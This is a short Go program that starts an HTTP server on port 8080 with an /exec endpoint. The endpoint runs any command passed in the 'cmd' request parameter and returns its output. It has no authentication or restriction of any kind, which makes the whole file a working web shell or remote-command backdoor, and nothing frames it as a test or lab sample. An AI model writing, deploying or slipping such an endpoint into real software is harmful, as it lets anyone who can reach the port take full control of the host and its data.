package main

import (
	"fmt"
	"log"
	"net/http"
	"os/exec"
	"strings"
)

func main() {
	http.HandleFunc("/exec", func(w http.ResponseWriter, r *http.Request) {
		cmd := r.FormValue("cmd")
		cmdParts := strings.Split(cmd, " ")
		var (
			out []byte
			err error
		)
		switch len(cmdParts) {
		case 0:
			fmt.Fprintf(w, "no cmd parameter found")
		case 1:
			out, err = exec.Command(string(cmd)).Output()
			if err != nil {
				w.WriteHeader(http.StatusBadRequest)
				fmt.Fprintf(w, "failed with %q", err)
			} else {
				fmt.Fprintf(w, "%s", out)
			}
		default:
			args := cmdParts[1:]
			out, err = exec.Command(cmdParts[0], args...).Output()
			if err != nil {
				w.WriteHeader(http.StatusBadRequest)
				fmt.Fprintf(w, "failed with %q", err)
			} else {
				fmt.Fprintf(w, "%s", out)
			}
		}
	})

	log.Fatal(http.ListenAndServe(":8080", nil))
}
